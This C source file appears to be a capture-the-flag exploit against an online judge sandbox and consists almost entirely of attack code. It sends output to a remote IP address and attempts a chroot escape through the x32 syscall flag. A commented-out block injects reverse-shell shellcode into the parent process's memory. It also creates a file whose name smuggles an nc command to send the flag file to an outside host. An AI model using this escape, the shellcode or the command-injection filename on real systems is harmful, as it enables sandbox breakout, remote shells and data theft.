#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/syscall.h>
#define PORT "\x7a\x69"
#define IPADDR "\x65\xc8\x8a\x1f"
unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02"PORT"\xc7\x44\x24\x04"IPADDR"\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05";
int main(int argc, char* argv[], char* envp[])
{
struct sockaddr_in sin;
struct stat st;
        char buf[100];
off_t l = 0;
int s = socket(2,1,0);
sin.sin_family = AF_INET;
sin.sin_port = htons(9999);
sin.sin_addr.s_addr = inet_addr("101.200.138.31");
connect(s, (struct sockaddr*)&sin, sizeof(sin));
dup2(s, 1);
puts("Start");
printf("%d %d\n", getuid(), getgid());
        chdir("/tmp/");
        mkdir(".345", 0777);
   if(syscall(SYS_chroot|0x40000000, ".345") < 0) printf("chroot %d\n", errno);
        int x;for(x=0;x<1000;x++) chdir("..");
        if(syscall(SYS_chroot|0x40000000, ".")<0) printf("chroot2 %d\n", errno);
       /* snprintf(buf,99,"/proc/%d/mem", getppid());
 int fd=open(buf, O_RDWR);
if(fd<0) printf("open %d\n", errno);
char* b=malloc(0x3000);memset(b, 0x90, 0x3000);
memcpy(b+0x3000-sizeof(code), code, sizeof(code));
lseek(fd, 0x400000, SEEK_SET);
write(fd, b, 0x3000);*/
int fd2 = open("/home/ctf/oj/src/;nc 101.200.138.31 31337 < flag;.c", O_RDWR|O_CREAT);
if(fd2 <0) printf("open %d\n", fd2);
puts("Finished");
return 0;
}
